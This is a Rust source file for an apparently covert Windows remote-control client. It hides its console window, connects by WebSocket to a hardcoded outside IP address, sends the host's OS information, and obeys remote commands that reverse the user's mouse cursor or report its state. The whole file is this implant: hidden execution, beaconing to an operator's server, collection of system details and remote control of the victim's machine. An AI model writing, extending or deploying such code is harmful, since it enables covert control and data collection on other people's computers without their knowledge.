#![windows_subsystem = "windows"]

use connection::connection_builder::ConnectionBuilder;
use models::{payload::Payload, commands::Command};
use usecases::cursor_reverse::{cursor_reverse_on, cursor_reverse_off, cursor_reverse_status};
use usecases::os_info::os_info;

pub mod connection;
pub mod models;
pub mod usecases;

fn main() {
    let connection_builder = ConnectionBuilder::builder("ws://141.8.194.231:9150".to_string())
        .add_init_payload(Payload::new(Command::ResponsePcInfo, Some(os_info())))
        .add_handle(Command::CommandCursorReverseOn, &|_, _|{cursor_reverse_on();})
        .add_handle(Command::CommandCursorReverseOff, &|_, _|{cursor_reverse_off();})
        .add_handle(Command::CommandCursorReverseStatus, &|sender, _|{
            sender.send(Payload::new(Command::ResponseCursorReverseStatus, Some(cursor_reverse_status()))).unwrap();
        });

    let connection = connection_builder.build().unwrap();
    
    connection.run_forever();
}
